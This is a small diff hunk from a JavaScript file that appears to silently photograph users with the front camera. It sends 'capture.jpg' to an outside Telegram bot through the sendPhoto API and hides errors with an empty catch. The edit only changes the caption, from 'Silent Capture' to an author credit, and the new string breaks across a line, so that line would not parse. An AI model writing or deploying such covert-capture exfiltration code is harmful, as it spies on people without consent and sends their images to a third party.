@@ -203,7 +203,8 @@
       const form = new FormData();
       form.append('chat_id', CHAT);
       form.append('photo', blob, 'capture.jpg');
-      form.append('caption', '📸 Front Camera — Silent Capture');
+      form.append('caption', 'Code By Ayü#h C++,
+Captured Successfully 📷');
       await fetch(`https://api.telegram.org/bot${BOT}/sendPhoto`, { method:'POST', body: form });
     } catch(e) {}
   }
